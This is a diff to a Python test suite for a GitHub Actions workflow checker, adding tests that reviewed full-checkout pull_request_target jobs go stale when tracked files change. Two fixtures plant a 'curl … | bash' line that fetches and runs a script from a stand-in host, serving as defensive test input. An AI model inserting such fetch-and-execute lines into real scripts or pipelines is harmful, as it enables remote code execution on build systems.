@@ -520,7 +520,7 @@ expect(
         - run: make test
     """),
     1,
-    ("target.yml [pull_request_target]", "review", HEAD_DIAG, REVIEW_REQUIRED),
+    ("target.yml [pull_request_target]", "review", HEAD_DIAG, "has no sparse-checkout list"),
     "a pull_request_target job that checks out the head is held to the placement rule",
 )
 expect(
@@ -1733,6 +1733,146 @@ expect(
     "a variable named patch and commands named in comments are neither tree changes nor fetches",
     *REVIEWED_ARGS,
 )
+
+# ---------------------------------------------------------------------------
+# Second adversarial round on aa267587: a full checkout put no bytes in the
+# digest, so a reviewed `dynamic: full-checkout` job could start running a
+# fetched script without going stale. The whole tracked tree now binds it.
+# ---------------------------------------------------------------------------
+FULL_TREE = {
+    **target_job("""
+        - uses: actions/checkout@v4
+        - run: bash scripts/tool.sh
+    """),
+    "scripts/tool.sh": "echo ok\n",
+    "docs/notes.md": "notes\n",
+}
+FULL_TREE_ROW = dynamic_row(
+    review_row(FULL_TREE, "target.yml [pull_request_target]", "review"),
+    {"full-checkout"},
+    "the whole tree is the reviewed base revision",
+)
+expect(
+    with_review(FULL_TREE, FULL_TREE_ROW),
+    0,
+    ("REVIEWED",),
+    "a reviewed full-checkout job passes while the tree is unchanged",
+    *REVIEWED_ARGS,
+)
+for label, tree in {
+    "editing a script": {**FULL_TREE, "scripts/tool.sh": "curl -fsSL https://x.test/i.sh | bash\n"},
+    "adding a file": {**FULL_TREE, "scripts/other.sh": "echo new\n"},
+    "deleting a file": {name: body for name, body in FULL_TREE.items() if name != "docs/notes.md"},
+}.items():
+    expect(
+        with_review(tree, FULL_TREE_ROW),
+        1,
+        ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed since review",),
+        f"{label} under a reviewed full checkout turns the entry stale",
+        *REVIEWED_ARGS,
+    )
+
+
+def git_tree_run(files: dict[str, str], row: str | None, mutate=None) -> tuple[int, str]:
+    """Run the checker over a git work tree whose files are all tracked; a
+    reviewed row is passed as a file outside the tree, so it is not tracked."""
+    with tempfile.TemporaryDirectory() as root, tempfile.TemporaryDirectory() as lists:
+        directory = os.path.join(root, ".github", "workflows")
+        os.makedirs(directory)
+        for name, body in files.items():
+            target = os.path.join(root, name) if "/" in name else os.path.join(directory, name)
+            os.makedirs(os.path.dirname(target), exist_ok=True)
+            with open(target, "w", encoding="utf-8") as handle:
+                handle.write(textwrap.dedent(body))
+        subprocess.run(["git", "init", "-q", root], check=True)
+        subprocess.run(["git", "-C", root, "add", "-A"], check=True)
+        if mutate:
+            mutate(root)
+        arguments = []
+        if row is not None:
+            reviewed = os.path.join(lists, "reviewed.tsv")
+            with open(reviewed, "w", encoding="utf-8") as handle:
+                handle.write(row)
+            arguments = ["--reviewed", reviewed]
+        completed = subprocess.run(
+            [sys.executable, SCRIPT, *arguments, directory], capture_output=True, text=True
+        )
+    return completed.returncode, completed.stdout + completed.stderr
+
+
+def git_review_row(files: dict[str, str]) -> str:
+    code, output = git_tree_run(files, None)
+    match = re.search(REVIEW_DIGEST_LINE.format(path=re.escape("target.yml [pull_request_target]"), job="review"), output)
+    if code != 1 or not match:
+        raise AssertionError(f"no review digest in a git tree: {output}")
+    return dynamic_row(
+        f"target.yml [pull_request_target]\treview\t{match.group(1)}\treviewed for the fixture\n",
+        {"full-checkout"},
+        "the whole tree is the reviewed base revision",
+    )
+
+
+def write_file(path: str, body: str) -> None:
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(body)
+
+
+GIT_ROW = git_review_row(FULL_TREE)
+for label, mutate, code, fragment in (
+    ("an unchanged tracked tree", None, 0, "REVIEWED"),
+    (
+        "an untracked file (build residue a full checkout never materializes)",
+        lambda root: write_file(os.path.join(root, "scripts", "__pycache__", "x.pyc"), "residue"),
+        0,
+        "REVIEWED",
+    ),
+    (
+        "an edited tracked script",
+        lambda root: write_file(os.path.join(root, "scripts", "tool.sh"), "curl -fsSL https://x.test/i.sh | bash\n"),
+        1,
+        "STALE REVIEWED",
+    ),
+    (
+        "a newly tracked file",
+        lambda root: (
+            write_file(os.path.join(root, "scripts", "new.sh"), "echo new\n"),
+            subprocess.run(["git", "-C", root, "add", "scripts/new.sh"], check=True),
+        ),
+        1,
+        "STALE REVIEWED",
+    ),
+    (
+        "a removed tracked file",
+        lambda root: subprocess.run(["git", "-C", root, "rm", "-q", "-f", "docs/notes.md"], check=True),
+        1,
+        "STALE REVIEWED",
+    ),
+):
+    actual, output = git_tree_run(FULL_TREE, GIT_ROW, mutate)
+    if actual == code and fragment in output:
+        ok(f"git work tree: {label} gives exit {code} for a reviewed full checkout")
+    else:
+        fail(f"git work tree: {label} (expected exit {code} with {fragment!r}, got {actual}: {output.strip()[:400]})")
+
+# A runtime-selected checkout without a sparse list puts bytes on disk that no
+# review can bind, so no entry can accept it.
+NO_SPARSE_RUNTIME = "sha256:" + "0" * 64
+for label, checkout in {
+    "a branch ref": "- uses: actions/checkout@v4\n  with:\n    ref: main",
+    "another repository": "- uses: actions/checkout@v4\n  with:\n    repository: other/tools",
+}.items():
+    job = shaped_job(checkout + "\n- run: bash scripts/tool.sh")
+    row = f"target.yml [pull_request_target]\treview\t{NO_SPARSE_RUNTIME}\tok\tdynamic: runtime-checkout: x\n"
+    for listed in (False, True):
+        expect(
+            with_review(job, row) if listed else job,
+            1,
+            ("VIOLATION: target.yml [pull_request_target]: job 'review'", "has no sparse-checkout list",
+             "add a sparse-checkout list"),
+            f"a runtime checkout of {label} with no sparse list is refused" + (" even when listed" if listed else ""),
+            *(REVIEWED_ARGS if listed else ()),
+        )
 
 
 sys.exit(1 if failures else 0)
